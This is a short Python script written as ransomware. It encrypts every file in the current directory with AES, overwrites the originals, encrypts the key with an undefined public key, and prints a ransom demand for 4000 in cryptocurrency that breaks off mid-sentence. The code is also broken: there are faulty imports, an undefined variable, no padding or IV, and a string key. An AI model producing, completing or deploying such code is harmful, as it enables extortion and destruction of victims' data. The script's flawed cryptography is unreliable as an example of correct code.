import os
import sys
import hashlib
import Crypto
import random

# Generate a random key for encryption
key = ''
for i in range(16):
    key += str(random.randint(0,9))

# Get the list of all database files in the local directory
db_files = os.listdir()

# Encrypt all the database files
for db_file in db_files:
    if os.path.isfile(db_file):
        # Open the file and read its contents
        with open(db_file, 'rb') as f:
            content = f.read()
            # Generate a SHA256 hash of the content
            content_hash = hashlib.sha256(content).hexdigest()
            # Encrypt the content using the random key
            encrypted_content = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CBC).encrypt(content)
            # Write the encrypted content to the file
            with open(db_file, 'wb') as f:
                f.write(encrypted_content)
            # Store the hash of the original content in a file
            with open(db_file + '.hash', 'w') as f:
                f.write(content_hash)

# Encrypt the key using a public key
encrypted_key = Crypto.Cipher.PKCS1_OAEP.new(public_key).encrypt(key)

# Write the encrypted key to a file
with open('key.enc', 'wb') as f:
    f.write(encrypted_key)

# Display a message to the user
print('Your files have been encrypted. To decrypt your files, you must pay 4000 in crypto to ')